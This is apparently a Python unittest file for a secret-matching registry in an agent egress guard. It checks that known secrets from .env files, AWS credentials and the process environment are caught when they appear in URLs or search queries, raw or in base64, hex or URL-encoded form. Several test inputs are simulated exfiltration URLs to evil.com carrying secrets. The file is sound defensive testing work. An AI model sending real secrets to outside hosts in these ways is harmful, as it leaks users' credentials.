"""Tests for SecretRegistry — known-secret exact-matching for Ghost Egress Guard.

Covers:
  - Source parsers (.env, AWS credentials, SSH fingerprints, process env)
  - Transform correctness (raw, url_encoded, base64, base64url, hex)
  - Fingerprinting (SHA-256 → first-8-hex)
  - Matching (positive hits per transform/location, negative controls)
  - Integration with Ghost Egress Guard (filtered + ask mode defense-in-depth)
  - Degraded/unavailable registry fail-safe behavior
  - Privacy (no raw secrets in outputs)
  - Memory limits (max records, max tokens)
  - Lifecycle (load, refresh, invalidate)
"""

import base64
import hashlib
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch
from urllib.parse import quote as url_quote

from unwind.enforcement.secret_registry import (
    SecretRegistry,
    SecretRegistryConfig,
    SourceKind,
    TransformKind,
    RegistryState,
    MatchLocation,
    MatchResult,
    _fingerprint,
    _generate_transforms,
    _is_secret_env_name,
    _parse_env_file,
    _parse_aws_credentials,
    _ssh_pub_fingerprints,
    _collect_process_env,
)


# ──────────────────────────────────────────────
# Fingerprinting
# ──────────────────────────────────────────────

class TestFingerprinting(unittest.TestCase):

    def test_fingerprint_is_8_hex_chars(self):
        fp = _fingerprint("my-secret-value")
        self.assertEqual(len(fp), 8)
        self.assertTrue(all(c in "0123456789abcdef" for c in fp))

    def test_fingerprint_deterministic(self):
        self.assertEqual(_fingerprint("test"), _fingerprint("test"))

    def test_fingerprint_different_inputs(self):
        self.assertNotEqual(_fingerprint("secret1"), _fingerprint("secret2"))

    def test_fingerprint_matches_sha256(self):
        value = "known-value"
        expected = hashlib.sha256(value.encode("utf-8")).hexdigest()[:8]
        self.assertEqual(_fingerprint(value), expected)


# ──────────────────────────────────────────────
# Transform Generation
# ──────────────────────────────────────────────

class TestTransformGeneration(unittest.TestCase):

    def test_generates_all_transform_kinds(self):
        transforms = _generate_transforms("my-secret")
        kinds = {k for k, _ in transforms}
        self.assertIn(TransformKind.RAW, kinds)
        self.assertIn(TransformKind.URL_ENCODED, kinds)
        self.assertIn(TransformKind.BASE64, kinds)
        self.assertIn(TransformKind.BASE64URL, kinds)
        self.assertIn(TransformKind.HEX, kinds)

    def test_raw_is_original(self):
        transforms = dict(_generate_transforms("test-secret"))
        self.assertEqual(transforms[TransformKind.RAW], "test-secret")

    def test_url_encoded(self):
        transforms = dict(_generate_transforms("key=val&foo"))
        self.assertEqual(transforms[TransformKind.URL_ENCODED], url_quote("key=val&foo", safe=""))

    def test_base64(self):
        transforms = dict(_generate_transforms("my-secret"))
        expected = base64.b64encode(b"my-secret").decode("ascii")
        self.assertEqual(transforms[TransformKind.BASE64], expected)

    def test_base64url(self):
        transforms = dict(_generate_transforms("my-secret"))
        expected = base64.urlsafe_b64encode(b"my-secret").decode("ascii")
        self.assertEqual(transforms[TransformKind.BASE64URL], expected)

    def test_hex(self):
        transforms = dict(_generate_transforms("my-secret"))
        expected = b"my-secret".hex()
        self.assertEqual(transforms[TransformKind.HEX], expected)

    def test_deduplicates_tokens(self):
        # If base64 and base64url produce same output, only one is kept
        transforms = _generate_transforms("aaaaaa")  # simple input
        tokens = [t for _, t in transforms]
        self.assertEqual(len(tokens), len(set(tokens)))

    def test_no_empty_tokens(self):
        transforms = _generate_transforms("x" * 8)
        for _, token in transforms:
            self.assertTrue(len(token) > 0)


# ──────────────────────────────────────────────
# Env Name Pattern Matching
# ──────────────────────────────────────────────

class TestEnvNamePatterns(unittest.TestCase):

    def test_matches_api_key(self):
        self.assertTrue(_is_secret_env_name("MY_API_KEY", ["API_KEY"]))

    def test_matches_secret(self):
        self.assertTrue(_is_secret_env_name("DATABASE_SECRET", ["SECRET"]))

    def test_case_insensitive(self):
        self.assertTrue(_is_secret_env_name("my_api_key", ["API_KEY"]))

    def test_no_match(self):
        self.assertFalse(_is_secret_env_name("DEBUG", ["API_KEY", "SECRET"]))

    def test_matches_token(self):
        self.assertTrue(_is_secret_env_name("GITHUB_TOKEN", ["TOKEN"]))

    def test_matches_password(self):
        self.assertTrue(_is_secret_env_name("DB_PASSWORD", ["PASSWORD"]))


# ──────────────────────────────────────────────
# .env File Parser
# ──────────────────────────────────────────────

class TestEnvFileParsing(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def _write(self, name, content):
        path = Path(self.tmpdir) / name
        path.write_text(content)
        return path

    def test_basic_key_value(self):
        path = self._write(".env", "API_KEY=sk-123456789012\nDB_HOST=localhost\n")
        pairs = _parse_env_file(path)
        self.assertEqual(len(pairs), 2)
        self.assertEqual(pairs[0], ("API_KEY", "sk-123456789012"))

    def test_quoted_values(self):
        path = self._write(".env", 'SECRET="my secret value"\n')
        pairs = _parse_env_file(path)
        self.assertEqual(pairs[0][1], "my secret value")

    def test_single_quoted(self):
        path = self._write(".env", "KEY='value here'\n")
        pairs = _parse_env_file(path)
        self.assertEqual(pairs[0][1], "value here")

    def test_comments_ignored(self):
        path = self._write(".env", "# This is a comment\nKEY=value\n")
        pairs = _parse_env_file(path)
        self.assertEqual(len(pairs), 1)

    def test_blank_lines_ignored(self):
        path = self._write(".env", "\n\nKEY=value\n\n")
        pairs = _parse_env_file(path)
        self.assertEqual(len(pairs), 1)

    def test_missing_file_returns_empty(self):
        pairs = _parse_env_file(Path("/nonexistent/.env"))
        self.assertEqual(pairs, [])

    def test_no_equals_line_skipped(self):
        path = self._write(".env", "INVALID LINE\nKEY=val\n")
        pairs = _parse_env_file(path)
        self.assertEqual(len(pairs), 1)

    def test_empty_value_skipped(self):
        path = self._write(".env", "KEY=\n")
        pairs = _parse_env_file(path)
        self.assertEqual(len(pairs), 0)

    def test_value_with_equals(self):
        path = self._write(".env", "KEY=value=with=equals\n")
        pairs = _parse_env_file(path)
        self.assertEqual(pairs[0][1], "value=with=equals")


# ──────────────────────────────────────────────
# AWS Credentials Parser
# ──────────────────────────────────────────────

class TestAWSCredentialsParsing(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def test_parses_profile(self):
        path = Path(self.tmpdir) / "credentials"
        path.write_text(
            "[default]\n"
            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        )
        pairs = _parse_aws_credentials(path)
        self.assertEqual(len(pairs), 2)
        names = [n for n, _ in pairs]
        self.assertIn("aws:default:aws_access_key_id", names)
        self.assertIn("aws:default:aws_secret_access_key", names)

    def test_multiple_profiles(self):
        path = Path(self.tmpdir) / "credentials"
        path.write_text(
            "[default]\n"
            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            "[prod]\n"
            "aws_access_key_id = AKIAI44QH8DHBEXAMPLE\n"
        )
        pairs = _parse_aws_credentials(path)
        self.assertEqual(len(pairs), 2)

    def test_missing_file_returns_empty(self):
        pairs = _parse_aws_credentials(Path("/nonexistent/credentials"))
        self.assertEqual(pairs, [])

    def test_session_token_extracted(self):
        path = Path(self.tmpdir) / "credentials"
        path.write_text(
            "[temp]\n"
            "aws_session_token = FwoGZXIvYXdzEBY_VERY_LONG_TOKEN_HERE\n"
        )
        pairs = _parse_aws_credentials(path)
        self.assertEqual(len(pairs), 1)
        self.assertIn("aws:temp:aws_session_token", pairs[0][0])


# ──────────────────────────────────────────────
# SSH Pub Fingerprints
# ──────────────────────────────────────────────

class TestSSHPubFingerprints(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def test_parses_pub_key(self):
        ssh_dir = Path(self.tmpdir)
        # Write a fake SSH public key
        key_data = base64.b64encode(b"fake-ssh-key-data-for-test").decode()
        (ssh_dir / "id_rsa.pub").write_text(f"ssh-rsa {key_data} test@host\n")

        pairs = _ssh_pub_fingerprints(ssh_dir)
        self.assertEqual(len(pairs), 1)
        name, fp = pairs[0]
        self.assertIn("ssh:id_rsa.pub", name)
        # Fingerprint is a 64-char hex string (full SHA-256)
        self.assertEqual(len(fp), 64)

    def test_missing_dir_returns_empty(self):
        pairs = _ssh_pub_fingerprints(Path("/nonexistent/ssh"))
        self.assertEqual(pairs, [])

    def test_no_pub_files_returns_empty(self):
        ssh_dir = Path(self.tmpdir)
        (ssh_dir / "id_rsa").write_text("PRIVATE KEY DATA")
        pairs = _ssh_pub_fingerprints(ssh_dir)
        self.assertEqual(pairs, [])


# ──────────────────────────────────────────────
# Process Env Collection
# ──────────────────────────────────────────────

class TestProcessEnvCollection(unittest.TestCase):

    @patch.dict(os.environ, {"MY_API_KEY": "test-secret-value-12345"}, clear=False)
    def test_collects_matching_env(self):
        pairs = _collect_process_env(["API_KEY"])
        names = [n for n, _ in pairs]
        self.assertIn("MY_API_KEY", names)

    @patch.dict(os.environ, {"DEBUG": "true"}, clear=False)
    def test_skips_non_matching(self):
        pairs = _collect_process_env(["API_KEY", "SECRET"])
        names = [n for n, _ in pairs]
        self.assertNotIn("DEBUG", names)

    @patch.dict(os.environ, {"MY_TOKEN": ""}, clear=False)
    def test_skips_empty_values(self):
        pairs = _collect_process_env(["TOKEN"])
        values = [v for _, v in pairs if _ == "MY_TOKEN"]
        self.assertEqual(len(values), 0)


# ──────────────────────────────────────────────
# SecretRegistry — Load / Lifecycle
# ──────────────────────────────────────────────

class TestSecretRegistryLoad(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.workspace = Path(self.tmpdir) / "workspace"
        self.workspace.mkdir()

    def _make_config(self, **overrides):
        defaults = dict(
            workspace_root=self.workspace,
            aws_credentials_path=Path(self.tmpdir) / ".aws" / "credentials",
            ssh_dir=Path(self.tmpdir) / ".ssh",
            env_secret_name_patterns=["API_KEY", "SECRET", "TOKEN"],
        )
        defaults.update(overrides)
        return SecretRegistryConfig(**defaults)

    def test_load_empty_workspace(self):
        config = self._make_config()
        registry = SecretRegistry(config)
        snapshot = registry.load()
        self.assertEqual(snapshot.record_count, 0)
        self.assertEqual(snapshot.token_count, 0)
        self.assertEqual(registry.state, RegistryState.READY)

    def test_load_with_env_file(self):
        env_path = self.workspace / ".env"
        env_path.write_text("SECRET_KEY=this-is-a-long-enough-secret\n")
        config = self._make_config()
        registry = SecretRegistry(config)
        snapshot = registry.load()
        self.assertGreater(snapshot.record_count, 0)
        self.assertGreater(snapshot.token_count, 0)
        self.assertIn(registry.state, (RegistryState.READY, RegistryState.DEGRADED))

    def test_load_with_aws_credentials(self):
        aws_dir = Path(self.tmpdir) / ".aws"
        aws_dir.mkdir()
        creds = aws_dir / "credentials"
        creds.write_text(
            "[default]\n"
            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        )
        config = self._make_config(aws_credentials_path=creds)
        registry = SecretRegistry(config)
        snapshot = registry.load()
        self.assertGreater(snapshot.record_count, 0)

    def test_version_increments(self):
        config = self._make_config()
        registry = SecretRegistry(config)
        registry.load()
        v1 = registry.snapshot().registry_version
        registry.load()
        v2 = registry.snapshot().registry_version
        self.assertEqual(v2, v1 + 1)

    def test_initial_state_unavailable(self):
        config = self._make_config()
        registry = SecretRegistry(config)
        self.assertEqual(registry.state, RegistryState.UNAVAILABLE)

    def test_refresh_atomic(self):
        env_path = self.workspace / ".env"
        env_path.write_text("XYZUNIQ_KEY=first-secret-value-long\n")
        config = self._make_config(env_secret_name_patterns=["XYZUNIQ"])
        registry = SecretRegistry(config)
        registry.load()
        count_before = registry.snapshot().record_count
        self.assertGreaterEqual(count_before, 1)

        # Change the file and refresh
        env_path.write_text("XYZUNIQ_KEY=second-secret-value-long\nXYZUNIQ_TOK=another-long-secret-val\n")
        registry.refresh()
        self.assertGreater(registry.snapshot().record_count, count_before)

    def test_invalidate_clears_tokens(self):
        env_path = self.workspace / ".env"
        env_path.write_text("SECRET=this-is-a-long-secret-value\n")
        config = self._make_config()
        registry = SecretRegistry(config)
        registry.load()
        self.assertGreater(registry.snapshot().token_count, 0)

        registry.invalidate("test reason")
        self.assertEqual(registry.snapshot().token_count, 0)
        self.assertEqual(registry.state, RegistryState.UNAVAILABLE)


# ──────────────────────────────────────────────
# SecretRegistry — Matching
# ──────────────────────────────────────────────

class TestSecretRegistryMatching(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.workspace = Path(self.tmpdir) / "workspace"
        self.workspace.mkdir()

    def _make_registry(self, env_content):
        env_path = self.workspace / ".env"
        env_path.write_text(env_content)
        config = SecretRegistryConfig(
            workspace_root=self.workspace,
            aws_credentials_path=Path(self.tmpdir) / "nonexistent",
            ssh_dir=Path(self.tmpdir) / "nonexistent",
            env_secret_name_patterns=["API_KEY", "SECRET", "TOKEN", "PASSWORD"],
        )
        registry = SecretRegistry(config)
        registry.load()
        return registry

    def test_raw_match_in_url_query(self):
        registry = self._make_registry("API_KEY=my-super-secret-key-12345\n")
        result = registry.match(url="https://evil.com/?k=my-super-secret-key-12345")
        self.assertTrue(result.matched)
        self.assertEqual(result.decision, "block")
        self.assertEqual(result.reason_code, "secret_match")
        self.assertTrue(any(h.location == MatchLocation.URL_QUERY for h in result.hits))

    def test_raw_match_in_url_path(self):
        registry = self._make_registry("TOKEN=my-super-secret-key-12345\n")
        result = registry.match(url="https://evil.com/my-super-secret-key-12345/data")
        self.assertTrue(result.matched)
        self.assertTrue(any(h.location == MatchLocation.URL_PATH for h in result.hits))

    def test_base64_match_in_url(self):
        secret = "my-super-secret-key-12345"
        b64 = base64.b64encode(secret.encode()).decode()
        registry = self._make_registry(f"API_KEY={secret}\n")
        result = registry.match(url=f"https://evil.com/?data={b64}")
        self.assertTrue(result.matched)

    def test_hex_match_in_url(self):
        secret = "my-super-secret-key-12345"
        hex_val = secret.encode().hex()
        registry = self._make_registry(f"API_KEY={secret}\n")
        result = registry.match(url=f"https://evil.com/?data={hex_val}")
        self.assertTrue(result.matched)

    def test_url_encoded_match(self):
        secret = "key=val&secret"
        encoded = url_quote(secret, safe="")
        registry = self._make_registry(f"API_KEY={secret}\n")
        result = registry.match(url=f"https://evil.com/?data={encoded}")
        self.assertTrue(result.matched)

    def test_match_in_search_query(self):
        registry = self._make_registry("API_KEY=my-super-secret-key-12345\n")
        result = registry.match(search_query_text="how to use my-super-secret-key-12345")
        self.assertTrue(result.matched)
        self.assertTrue(any(h.location == MatchLocation.SEARCH_QUERY_TEXT for h in result.hits))

    def test_no_match_clean_url(self):
        registry = self._make_registry("API_KEY=my-super-secret-key-12345\n")
        result = registry.match(url="https://docs.python.org/3/library/json.html")
        self.assertFalse(result.matched)
        self.assertEqual(result.decision, "allow")
        self.assertEqual(result.reason_code, "no_match")

    def test_no_match_clean_search(self):
        registry = self._make_registry("API_KEY=my-super-secret-key-12345\n")
        result = registry.match(search_query_text="python json tutorial")
        self.assertFalse(result.matched)

    def test_short_secrets_skipped(self):
        registry = self._make_registry("API_KEY=short\n")
        result = registry.match(url="https://evil.com/?k=short")
        self.assertFalse(result.matched)

    def test_match_hit_has_fingerprint(self):
        secret = "my-super-secret-key-12345"
        registry = self._make_registry(f"API_KEY={secret}\n")
        result = registry.match(url=f"https://evil.com/?k={secret}")
        self.assertTrue(result.matched)
        self.assertTrue(len(result.hits) > 0)
        fp = result.hits[0].fingerprint_id
        self.assertEqual(len(fp), 8)
        expected = hashlib.sha256(secret.encode()).hexdigest()[:8]
        self.assertEqual(fp, expected)


# ──────────────────────────────────────────────
# SecretRegistry — Unavailable / Degraded
# ──────────────────────────────────────────────

class TestSecretRegistryFailSafe(unittest.TestCase):

    def test_unavailable_returns_block(self):
        config = SecretRegistryConfig(
            workspace_root=Path("/nonexistent"),
            aws_credentials_path=Path("/nonexistent"),
            ssh_dir=Path("/nonexistent"),
        )
        registry = SecretRegistry(config)
        # Don't call load() — stays UNAVAILABLE
        result = registry.match(url="https://example.com")
        self.assertEqual(result.decision, "block")
        self.assertEqual(result.reason_code, "registry_unavailable")

    def test_invalidated_returns_block(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        env_path = workspace / ".env"
        env_path.write_text("SECRET=long-enough-secret-value\n")

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config)
        registry.load()
        registry.invalidate("test")
        result = registry.match(url="https://example.com")
        self.assertEqual(result.decision, "block")
        self.assertEqual(result.reason_code, "registry_unavailable")

    def test_empty_registry_allows(self):
        config = SecretRegistryConfig(
            workspace_root=Path(tempfile.mkdtemp()),
            aws_credentials_path=Path("/nonexistent"),
            ssh_dir=Path("/nonexistent"),
        )
        registry = SecretRegistry(config)
        registry.load()
        # No secrets found but loaded OK → READY, allow
        result = registry.match(url="https://example.com")
        self.assertEqual(result.decision, "allow")
        self.assertEqual(result.reason_code, "no_match")


# ──────────────────────────────────────────────
# SecretRegistry — Memory Limits
# ──────────────────────────────────────────────

class TestSecretRegistryLimits(unittest.TestCase):

    def test_max_records_enforced(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        # Write lots of secrets
        lines = [f"SECRET_{i}=value-long-enough-{i:04d}\n" for i in range(200)]
        (workspace / ".env").write_text("".join(lines))

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
            max_records=10,
            env_secret_name_patterns=["SECRET"],
        )
        registry = SecretRegistry(config)
        snapshot = registry.load()
        self.assertLessEqual(snapshot.record_count, 10)

    def test_max_tokens_enforced(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        lines = [f"TOKEN_{i}=value-long-enough-secret-{i:04d}\n" for i in range(200)]
        (workspace / ".env").write_text("".join(lines))

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
            max_tokens=20,
            env_secret_name_patterns=["TOKEN"],
        )
        registry = SecretRegistry(config)
        snapshot = registry.load()
        self.assertLessEqual(snapshot.token_count, 20)


# ──────────────────────────────────────────────
# Privacy — No Raw Secrets in Output
# ──────────────────────────────────────────────

class TestPrivacy(unittest.TestCase):

    def test_snapshot_has_no_raw_values(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        secret = "super-secret-key-never-log-this"
        (workspace / ".env").write_text(f"API_KEY={secret}\n")

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config)
        registry.load()

        snapshot = registry.snapshot()
        snapshot_str = str(snapshot)
        self.assertNotIn(secret, snapshot_str)

    def test_match_hit_has_no_raw_value(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        secret = "super-secret-key-never-log-this"
        (workspace / ".env").write_text(f"API_KEY={secret}\n")

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config)
        registry.load()

        result = registry.match(url=f"https://evil.com/?k={secret}")
        self.assertTrue(result.matched)
        result_str = str(result)
        self.assertNotIn(secret, result_str)

    def test_status_has_no_raw_values(self):
        tmpdir = tempfile.mkdtemp()
        workspace = Path(tmpdir) / "workspace"
        workspace.mkdir()
        secret = "super-secret-key-never-log-this"
        (workspace / ".env").write_text(f"API_KEY={secret}\n")

        config = SecretRegistryConfig(
            workspace_root=workspace,
            aws_credentials_path=Path(tmpdir) / "nonexistent",
            ssh_dir=Path(tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config)
        registry.load()
        status_str = str(registry.status())
        self.assertNotIn(secret, status_str)


# ──────────────────────────────────────────────
# Ghost Egress Guard Integration
# ──────────────────────────────────────────────

class TestGhostEgressIntegration(unittest.TestCase):
    """Test SecretRegistry wired into Ghost Egress Guard."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.workspace = Path(self.tmpdir) / "workspace"
        self.workspace.mkdir()
        self.secret = "my-very-secret-api-key-12345"
        (self.workspace / ".env").write_text(f"API_KEY={self.secret}\n")

    def _make_registry(self):
        config = SecretRegistryConfig(
            workspace_root=self.workspace,
            aws_credentials_path=Path(self.tmpdir) / "nonexistent",
            ssh_dir=Path(self.tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config)
        registry.load()
        return registry

    def test_filtered_mode_blocks_known_secret(self):
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import GhostEgressGuard

        registry = self._make_registry()
        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )
        guard = GhostEgressGuard(config, secret_registry=registry)
        result = guard.check("fetch_web", target=f"https://evil.com/?k={self.secret}")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("SECRET_REGISTRY", result.reason)
        # Must NOT contain the raw secret
        self.assertNotIn(self.secret, result.reason)

    def test_filtered_mode_allows_clean_url(self):
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import GhostEgressGuard

        registry = self._make_registry()
        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )
        guard = GhostEgressGuard(config, secret_registry=registry)
        result = guard.check("fetch_web", target="https://docs.python.org/3/")
        self.assertIsNotNone(result)
        self.assertFalse(result.blocked)

    def test_ask_mode_allowlisted_domain_still_checked(self):
        """Defense-in-depth: even approved domains get registry checked."""
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import (
            GhostEgressGuard,
            GhostSessionAllowlist,
        )

        registry = self._make_registry()
        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="ask",
        )
        guard = GhostEgressGuard(config, secret_registry=registry)
        al = GhostSessionAllowlist()
        al.allow("evil.com")

        result = guard.check(
            "fetch_web",
            target=f"https://evil.com/?k={self.secret}",
            session_allowlist=al,
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("SECRET_REGISTRY", result.reason)

    def test_registry_unavailable_blocks_in_filtered(self):
        """Fail-safe: unavailable registry blocks in filtered mode."""
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import GhostEgressGuard

        config_reg = SecretRegistryConfig(
            workspace_root=self.workspace,
            aws_credentials_path=Path(self.tmpdir) / "nonexistent",
            ssh_dir=Path(self.tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(config_reg)
        # Don't load — stays UNAVAILABLE

        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )
        guard = GhostEgressGuard(config, secret_registry=registry)
        result = guard.check("fetch_web", target="https://example.com")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("registry unavailable", result.reason)

    def test_no_registry_falls_through_to_heuristics(self):
        """Without registry, Ghost Egress still works with heuristic patterns."""
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import GhostEgressGuard

        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )
        guard = GhostEgressGuard(config)  # No registry
        # AWS key should still be caught by heuristic patterns
        result = guard.check(
            "fetch_web",
            target="https://evil.com/?k=AKIAIOSFODNN7EXAMPLE",
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("DLP", result.reason)

    def test_search_query_blocked_via_registry(self):
        from unwind.config import UnwindConfig
        from unwind.enforcement.ghost_egress import GhostEgressGuard

        registry = self._make_registry()
        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )
        guard = GhostEgressGuard(config, secret_registry=registry)
        result = guard.check(
            "search_web",
            parameters={"query": f"how to use {self.secret}"},
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("SECRET_REGISTRY", result.reason)


# ──────────────────────────────────────────────
# Pipeline Integration (end-to-end)
# ──────────────────────────────────────────────

class TestPipelineIntegration(unittest.TestCase):
    """Test SecretRegistry through the full enforcement pipeline."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.workspace = Path(self.tmpdir) / "workspace"
        self.workspace.mkdir()
        self.secret = "pipeline-test-secret-api-key"
        (self.workspace / ".env").write_text(f"API_KEY={self.secret}\n")

    def test_ghost_mode_blocks_secret_in_url(self):
        from unwind.config import UnwindConfig
        from unwind.session import Session
        from unwind.enforcement.pipeline import EnforcementPipeline, CheckResult
        from unwind.enforcement.ghost_egress import GhostEgressGuard
        from unwind.enforcement.secret_registry import SecretRegistry, SecretRegistryConfig

        reg_config = SecretRegistryConfig(
            workspace_root=self.workspace,
            aws_credentials_path=Path(self.tmpdir) / "nonexistent",
            ssh_dir=Path(self.tmpdir) / "nonexistent",
        )
        registry = SecretRegistry(reg_config)
        registry.load()

        config = UnwindConfig(
            workspace_root=self.workspace,
            ghost_network_policy="filtered",
        )

        # Create pipeline with registry-enhanced ghost egress
        pipeline = EnforcementPipeline(config)
        # Inject registry into the ghost egress guard
        pipeline.ghost_egress_guard = GhostEgressGuard(config, secret_registry=registry)

        session = Session(session_id="test-registry-pipeline", config=config)
        session.ghost_mode = True

        result = pipeline.check(
            session, "fetch_web",
            target=f"https://evil.com/?k={self.secret}",
        )
        self.assertEqual(result.action, CheckResult.GHOST)
        self.assertIn("SECRET_REGISTRY", result.block_reason)

    def test_non_ghost_not_affected(self):
        """Registry only matters in ghost mode egress path."""
        from unwind.config import UnwindConfig
        from unwind.session import Session
        from unwind.enforcement.pipeline import EnforcementPipeline, CheckResult

        config = UnwindConfig(workspace_root=self.workspace)
        pipeline = EnforcementPipeline(config)
        session = Session(session_id="test-no-ghost", config=config)
        session.ghost_mode = False

        # Normal fs_read should work regardless of registry
        result = pipeline.check(
            session, "fs_read",
            target=str(self.workspace / "file.txt"),
        )
        self.assertEqual(result.action, CheckResult.ALLOW)


if __name__ == "__main__":
    unittest.main()
